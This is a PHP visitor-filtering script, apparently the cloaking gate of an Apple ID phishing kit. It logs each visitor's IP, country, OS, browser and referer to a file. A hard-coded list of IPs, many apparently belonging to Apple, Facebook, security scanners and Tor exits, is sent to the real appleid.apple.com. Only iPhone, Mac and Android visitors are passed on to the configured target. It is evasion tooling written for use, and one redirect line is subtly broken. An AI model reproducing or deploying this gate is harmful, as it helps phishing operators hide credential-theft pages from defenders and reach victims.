<?php
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
$tujuan = "http://google.com";
$belok = "http://bing.com";
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS() { 

    global $user_agent;

    $os_platform    =   "Another";

    $os_array       =   array(
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}
function get_browser_name($user_agent)
{
    if (strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR/')) return 'Opera';
    elseif (strpos($user_agent, 'Edge')) return 'Edge';
    elseif (strpos($user_agent, 'Chrome')) return 'Chrome';
    elseif (strpos($user_agent, 'Safari')) return 'Safari';
    elseif (strpos($user_agent, 'Firefox')) return 'Firefox';
    elseif (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/7')) return 'Internet Explorer';
    
    return 'Other';
}
$user_os        =   getOS();
$user_browser   =   get_browser_name($_SERVER['HTTP_USER_AGENT']);
$from  = $_SERVER['HTTP_REFERER'];
$ip    = $_SERVER['REMOTE_ADDR'];
$getip = 'http://ip-api.com/json/' . $ip;
$curl  = curl_init();
curl_setopt($curl, CURLOPT_URL, $getip);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$details      = json_decode($content);
$negara       = $details->countryCode;
$nama_negara  = $details->country;
$kode_negara  = strtolower($negara);
$ip = $_SERVER['REMOTE_ADDR'];
$dateTime = date("F j, Y, g:i a"); 
$denyIPs = array("37.187.129.166","109.203.125.34","95.211.230.94","133.11.204.134","81.161.59.17","91.231.212.111","50.17.27.5","95.85.8.153","151.29.173.203","163.172.139.161","104.236.185.29","46.101.119.24","212.92.112.151","162.243.187.126","5.157.33.117","34.237.113.113","54.183.40.98","34.253.186.228","151.80.38.67","144.76.22.83","178.32.216.192","72.30.14.73","50.97.98.153","199.59.150.182","136.243.154.93","69.164.111.198","163.172.128.98","182.75.120.10","51.15.54.85","144.76.22.213","72.30.14.92","17.142.159.185","150.70.173.5","163.172.138.81","51.15.53.163","199.59.150.183","52.21.255.183","199.59.150.180","184.173.211.18","73.204.5.117","184.173.226.128","184.173.226.129","75.76.51.51","204.13.201.137","85.17.14.20","85.17.14.21","77.234.90.5","115.112.129.194","184.173.226.130","104.238.46.114","212.21.66.6","38.80.23.38","38.80.23.35","38.80.27.84","51.15.46.174","51.15.52.84","163.172.139.91","87.118.116.12","69.80.245.139","51.15.58.219","173.16.163.104","71.234.230.249","64.28.50.130","174.255.201.10","178.197.236.253","51.255.66.112","54.91.107.158","17.142.155.148","50.97.101.74","139.59.149.99","76.170.163.214","96.32.140.241","96.94.247.225","213.104.23.200","204.13.201.139","107.178.194.123","196.52.2.62","107.4.37.238","85.248.227.165","157.55.39.66","17.198.249.137","17.220.176.23","17.207.49.21","17.198.181.18","17.207.49.17","17.209.77.17","17.207.49.19","17.197.166.17","17.218.20.18","17.229.103.17","17.220.176.17","17.198.249.153","17.198.181.20","17.226.7.20","205.201.132.14","70.228.93.92","148.163.128.145","74.73.64.254","66.220.156.144","198.71.237.19","180.242.46.254","100.8.140.46","71.35.85.138","107.77.70.87","94.23.173.249","54.174.33.17","79.172.193.32","69.171.228.116","171.25.193.77","66.220.156.179","185.170.42.4","74.137.8.217","66.220.151.208","108.28.40.159","8.28.16.254","199.91.135.163","70.140.101.146","66.220.148.166","70.120.238.144","52.21.176.42","12.246.227.34","216.255.122.67","96.85.185.145","99.74.248.133","50.78.251.5","54.165.181.10","104.173.38.222","85.54.15.51","51.15.54.85","115.112.129.194","212.47.233.68","180.149.246.212","96.250.80.17","51.15.42.114","51.15.46.174","45.63.19.185");
if (in_array ($ip, $denyIPs)) {
   $fh = fopen('alvin.txt', 'a+');
   fwrite($fh, 'Blocked by IPs:'." [ $nama_negara - $user_os - $user_browser - $ip - $dateTime ] $from\n");
   fclose($fh);
   header("Location: https://appleid.apple.com" ); exit();
}
if(strstr($_SERVER['HTTP_USER_AGENT'],'iPod') || strstr($_SERVER['HTTP_USER_AGENT'],'iPhone') || strstr($_SERVER['HTTP_USER_AGENT'],'iPad') || strstr($_SERVER['HTTP_USER_AGENT'],'Mac OS 9') || strstr($_SERVER['HTTP_USER_AGENT'],'Mac OS X') || strstr($_SERVER['HTTP_USER_AGENT'],'Android'))
{
   $fh = fopen('alvin.txt', 'a+');
   fwrite($fh, 'Accepted User-Agent:'." [ $nama_negara - $user_os - $user_browser - $ip - $dateTime ] $from\n");
   fclose($fh);
   header('Location: $tujuan'); exit();
}
else {
   $fh = fopen('alvin.txt', 'a+');
   fwrite($fh, 'Blocked User-Agent:'." [ $nama_negara - $user_os - $user_browser - $ip - $dateTime ] $from\n");
   fclose($fh);
   header("Location: $belok " ); exit();
}
?>
